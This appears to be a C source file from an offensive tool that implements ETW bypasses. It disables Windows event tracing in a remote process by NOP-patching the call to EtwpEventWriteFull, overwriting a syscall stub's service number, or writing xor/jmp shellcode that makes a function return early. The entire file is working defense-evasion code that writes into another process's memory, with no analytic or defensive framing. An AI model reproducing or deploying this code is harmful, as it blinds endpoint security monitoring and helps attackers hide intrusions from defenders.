#include "etw_bypass.h"

PBYTE findRetInstruction(PVOID function_start) {
	unsigned char* ptr = (unsigned char*)function_start;
	for (int i = 0; i < 0x400; i++) { // Scan up to 1024 bytes (arbitrary limit)
		if (ptr[i] == 0xC3) {         // Check for RET instruction (0xC3)
			return &ptr[i];
		}
	}
	return NULL; // No RET found in the scanned range
}

BOOL CallBasedEtwPatch(HANDLE hProcess, LPSTR functionName) {
	int i = 0;
	DWORD dwOldProtection = 0;
	PBYTE pEtwFunctionAddress = NULL;

	// 1. Get local address of the function
	HMODULE hLocalNtdll = GetModuleHandleA("ntdll");
	if (!hLocalNtdll) {
		DebugPrint("[!] Failed to get local ntdll handle\n");
		return FALSE;
	}

	pEtwFunctionAddress = (PBYTE)GetProcAddress(hLocalNtdll, functionName);
	if (!pEtwFunctionAddress) {
		DebugPrint("[!] GetProcAddress failed for target function\n");
		return FALSE;
	}

	DebugPrint("[+] Local address of \"%s\": 0x%p\n", functionName, pEtwFunctionAddress);

	// 4. Locate the 'call' instruction
	while (1) {
		if (pEtwFunctionAddress[i] == x64_RET_INSTRUCTION_OPCODE &&
			pEtwFunctionAddress[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	while (i) {
		if (pEtwFunctionAddress[i] == x64_CALL_INSTRUCTION_OPCODE) {
			pEtwFunctionAddress = &pEtwFunctionAddress[i];
			break;
		}
		i--;
	}

	if (!pEtwFunctionAddress || pEtwFunctionAddress[0] != x64_CALL_INSTRUCTION_OPCODE) {
		DebugPrint("[!] Failed to locate 'call' instruction in remote function\n");
		return FALSE;
	}

	DebugPrint("\t> Remote \"call EtwpEventWriteFull\": 0x%p\n", pEtwFunctionAddress);
	DebugPrint("\t> Patching with \"90 90 90 90 90\" ...\n");

	// 5. Change remote memory protection to RW
	if (!VirtualProtectEx(hProcess, pEtwFunctionAddress, PATCH_SIZE, PAGE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx failed with error %d\n", GetLastError());
		return FALSE;
	}

	// 6. Apply the patch
	BYTE nopPatch[PATCH_SIZE] = { NOP_INSTRUCTION_OPCODE, NOP_INSTRUCTION_OPCODE,
								  NOP_INSTRUCTION_OPCODE, NOP_INSTRUCTION_OPCODE,
								  NOP_INSTRUCTION_OPCODE };
	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(hProcess, pEtwFunctionAddress, nopPatch, PATCH_SIZE, &bytesWritten) ||
		bytesWritten != PATCH_SIZE) {
		DebugPrint("[!] WriteProcessMemory failed with error %d\n", GetLastError());
		return FALSE;
	}

	// 7. Restore original memory protection
	DWORD dwDummy = 0;
	if (!VirtualProtectEx(hProcess, pEtwFunctionAddress, PATCH_SIZE, dwOldProtection, &dwDummy)) {
		DebugPrint("[!] VirtualProtectEx restore failed with error %d\n", GetLastError());
		return FALSE;
	}

	DebugPrint("[+] Patch applied successfully!\n");
	return TRUE;
}

BOOL SyscallPatchEtw(HANDLE hProcess, LPSTR syscallName) {
	DWORD dwOldProtection = 0;
	BYTE* pLocalSyscall = NULL;
	BYTE* pRemoteSyscall = NULL;

	// 1. Get local address of the syscall function
	HMODULE hLocalNtdll = GetModuleHandleA("ntdll");
	if (!hLocalNtdll) {
		printf("[!] Failed to get local ntdll handle\n");
		return FALSE;
	}

	pLocalSyscall = (BYTE*)GetProcAddress(hLocalNtdll, syscallName);
	if (!pLocalSyscall) {
		printf("[!] GetProcAddress failed for %s\n", syscallName);
		return FALSE;
	}
	printf("\t> Local address of \"%s\": 0x%p\n", syscallName, pLocalSyscall);

	// 2. Get remote ntdll.dll base address (same as before)
	HMODULE hRemoteNtdll = NULL;
	MODULEENTRY32 me32 = { sizeof(MODULEENTRY32) };
	HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(hProcess));
	if (hModuleSnap == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot failed\n");
		return FALSE;
	}
	BOOL found = FALSE;
	if (Module32First(hModuleSnap, &me32)) {
		do {
			if (_stricmp(me32.szModule, "ntdll.dll") == 0) {
				hRemoteNtdll = (HMODULE)me32.modBaseAddr;
				found = TRUE;
				break;
			}
		} while (Module32Next(hModuleSnap, &me32));
	}
	CloseHandle(hModuleSnap);

	if (!found) {
		printf("[!] Failed to find ntdll.dll in remote process\n");
		return FALSE;
	}

	// 3. Calculate offset of syscall function inside local ntdll.dll
	ptrdiff_t offset = pLocalSyscall - (BYTE*)hLocalNtdll;

	// 4. Calculate remote function address
	pRemoteSyscall = (BYTE*)hRemoteNtdll + offset;

	// 5. Find SSN pointer in local function
	BYTE* pLocalSSNPtr = NULL;
	for (int i = 0; i < x64_SYSCALL_STUB_SIZE; i++) {
		if (pLocalSyscall[i] == x64_MOV_INSTRUCTION_OPCODE) {
			pLocalSSNPtr = &pLocalSyscall[i + 1];
			break;
		}
		if (pLocalSyscall[i] == x64_RET_INSTRUCTION_OPCODE || pLocalSyscall[i] == 0x0F || pLocalSyscall[i] == 0x05)
			return FALSE;
	}
	if (!pLocalSSNPtr) {
		printf("[!] Failed to find SSN pointer in local function\n");
		return FALSE;
	}

	// Calculate offset of SSN pointer relative to local function start
	ptrdiff_t ssnOffset = pLocalSSNPtr - pLocalSyscall;

	// 6. Calculate remote SSN pointer address
	BYTE* pRemoteSSNPtr = pRemoteSyscall + ssnOffset;
	printf("\t> Remote SSN pointer position: 0x%p\n", pRemoteSSNPtr);

	// 7. Change protection in remote process
	if (!VirtualProtectEx(hProcess, pRemoteSSNPtr, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx failed with error %d\n", GetLastError());
		return FALSE;
	}

	// 8. Write dummy SSN (0x000000FF) to remote process memory
	DWORD dummySSN = 0x000000FF;
	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(hProcess, pRemoteSSNPtr, &dummySSN, sizeof(DWORD), &bytesWritten) || bytesWritten != sizeof(DWORD)) {
		printf("[!] WriteProcessMemory failed with error %d\n", GetLastError());
		return FALSE;
	}

	// 9. Restore original protection
	DWORD dwDummy = 0;
	if (!VirtualProtectEx(hProcess, pRemoteSSNPtr, sizeof(DWORD), dwOldProtection, &dwDummy)) {
		printf("[!] VirtualProtectEx restore failed with error %d\n", GetLastError());
		return FALSE;
	}

	printf("[+] PatchSyscallRemote applied successfully!\n");
	return TRUE;
}


BOOL JmpRetBasedEtwPatch(HANDLE hProcess, LPSTR functionName) {
	DWORD       dwOldProtection = 0;
	BYTE        pShellcode[7]   = { 0 };
	DWORD       jmpOffset       = 0;
    PBYTE       pFunctionAddr  = NULL;

	DebugPrint(">> Current process: %d\n", GetCurrentProcessId());
	DebugPrint(">> Target process: %d\n", GetProcessId(hProcess));

    if (strcmp(functionName, "EtwpEventWriteFull") == 0) {
		pFunctionAddr = fetchEtwpEventWriteFullAddr(hProcess);
        if (!pFunctionAddr) {
			DebugPrint("[!] Failed to fetch EtwpEventWriteFull address.\n");
            return FALSE;
        }
        DebugPrint("[+] EtwpEventWriteFull : 0x%p \n", pFunctionAddr);
    } else {
		// 1. Get local module base address for ntdll.dll
		HMODULE hLocalNtdll = GetModuleHandleA("ntdll");
		if (!hLocalNtdll) {
			DebugPrint("[!] Failed to get local ntdll handle\n");
			return FALSE;
		}

		// 2. Get local function address
		pFunctionAddr = (PBYTE)GetProcAddress(hLocalNtdll, functionName);
		if (!pFunctionAddr) {
			DebugPrint("[!] Failed to get local function address\n");
			return FALSE;
		}
    }

	// 6. Find RET instruction locally (you must ensure findRetInstruction can work for local pointers)
	PBYTE pRetAddress = (PBYTE)findRetInstruction(pFunctionAddr);
	if (!pRetAddress) {
		DebugPrint("[!] Unable to locate RET instruction\n");
		return FALSE;
	}
	// Calculate jmp offset relative to function start (same as before)
	jmpOffset = (DWORD)(pRetAddress - (pFunctionAddr + sizeof(pShellcode)));

	// 7. Prepare shellcode
	pShellcode[0] = 0x33;  // xor eax, eax
	pShellcode[1] = 0xC0;
	pShellcode[2] = 0xE9;  // jmp instruction
	*(DWORD*)&pShellcode[3] = jmpOffset;

	DebugPrint("\t> Patching remote process at 0x%p with JMP to RET\n", pFunctionAddr);

	// 8. Change memory protection in remote process
	if (!VirtualProtectEx(hProcess, pFunctionAddr, sizeof(pShellcode), PAGE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx failed with error %d\n", GetLastError());
		return FALSE;
	}

	// 9. Write patch to remote process
	SIZE_T bytesWritten = 0;
	DebugPrint("[i] Writting to %p\n", pFunctionAddr);
	if (!WriteProcessMemory(hProcess, pFunctionAddr, pShellcode, sizeof(pShellcode), &bytesWritten) || bytesWritten != sizeof(pShellcode)) {
		DebugPrint("[!] WriteProcessMemory failed with error %d\n", GetLastError());
		return FALSE;
	}

	// 10. Restore original protection
	DWORD dwDummy = 0;
	if (!VirtualProtectEx(hProcess, pFunctionAddr, sizeof(pShellcode), dwOldProtection, &dwDummy)) {
		DebugPrint("[!] VirtualProtectEx restore failed with error %d\n", GetLastError());
		return FALSE;
	}

	DebugPrint("[+] Patch applied successfully.\n");
	return TRUE;
}
